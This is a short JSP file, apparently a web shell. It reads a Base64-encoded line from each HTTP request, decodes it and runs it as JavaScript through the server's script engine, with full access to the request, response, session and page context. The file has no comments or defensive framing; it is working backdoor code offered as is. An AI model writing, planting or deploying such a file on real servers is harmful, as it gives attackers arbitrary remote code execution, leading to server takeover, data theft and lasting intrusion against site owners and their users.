<%@ page import="javax.script.ScriptEngine" %>
<%@ page import="javax.script.ScriptException" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>
<%
    ScriptEngine engine = (new javax.script.ScriptEngineManager()).getEngineByName("js");
    engine.put("request",request);
    engine.put("response",response);
    engine.put("session",session);
    engine.put("pageContext",pageContext);
    String s = request.getReader().readLine();
    s = new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
    try {
        engine.eval(s);
    } catch (ScriptException e) {
        throw new RuntimeException(e);
    }
%>

